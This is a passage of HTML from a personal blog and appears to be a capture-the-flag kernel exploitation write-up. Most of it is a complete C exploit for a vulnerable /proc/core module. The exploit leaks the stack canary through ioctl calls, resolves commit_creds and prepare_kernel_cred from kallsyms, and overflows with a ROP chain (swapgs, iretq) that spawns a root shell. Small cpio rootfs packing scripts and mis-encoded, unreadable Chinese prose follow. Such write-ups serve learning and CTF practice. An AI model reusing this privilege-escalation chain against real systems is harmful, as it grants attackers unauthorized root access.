class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd=fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]opne kallsyms error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (fgets(buf,<span class="number">0x30</span>,kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">        <span class="keyword">if</span>(commit_creds&amp;prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>)&amp;&amp;!commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds_addr:%p\n&quot;</span>,commit_creds);</span><br><span class="line">            vmlinux_base=commit_creds<span class="number">-0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base_addr:%p&quot;</span>,vmlinux_base);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>)&amp;&amp;!prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred_addr:%p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">            vmlinux_base=prepare_kernel_cred<span class="number">-0x9cce0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred&amp;commit_creds))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]addr error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>,idx);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889c</span>,idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size :%ld\n&quot;</span>,size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">privilege_escalation</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)&#123;</span><br><span class="line">        (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))(</span><br><span class="line">            (*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_cred))(<span class="number">0</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open core error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;</span><br><span class="line">    set_off(fd,<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd,buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary=((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]canary: %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        rop[i]=canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] =(<span class="keyword">size_t</span>)privilege_escalation;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)usr_shell;         <span class="comment">// rip </span></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    write(fd,rop,<span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè®°å½•ä¸€ä¸‹è‡ªå·±å†™çš„æ‰“åŒ…å’Œè§£åŒ…çš„shellè„šæœ¬</p>
<p>è§£åŒ… å‘½ä»¤è¡Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›¸å¯¹äºrootfsæ–‡ä»¶å¤¹cpioçš„ç›¸å¯¹è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯åœ¨rootfsæ–‡ä»¶ä¸­å‚¨å­˜cpioæ–‡ä»¶çš„æ–‡ä»¶åï¼Œæ³¨æ„å¦‚æœcpioæ–‡ä»¶æ˜¯å‹ç¼©åŒ…å½¢å¼ï¼Œé‚£å…ˆè§£å‹ç¼©ï¼Œç„¶åå†æ‰§è¡Œshellè„šæœ¬</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">mkdir rootfs</span><br><span class="line">cd rootfs</span><br><span class="line">mv $1 $2</span><br><span class="line">cpio -idmv &lt; $2</span><br><span class="line">mv $2 $1</span><br></pre></td></tr></table></figure>

<p>æ‰“åŒ… ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‚¨å­˜cpioæ–‡ä»¶ç›¸å¯¹è·¯å¾„ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc &gt; $1</span><br></pre></td></tr></table></figure>

<p>ä¸€èˆ¬æƒ…å†µä¸‹æŒºå¥½ç”¨çš„ï¼Œä½†æœ‰æ—¶å€™é¢˜ç›®ä¼šç»™æ‰“åŒ…å’Œè§£åŒ…æ–‡ä»¶ï¼Œæ³¨æ„ä½¿ç”¨é¢˜ç›®ç»™çš„ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">æˆ‘çš„åšå®¢</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">33</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
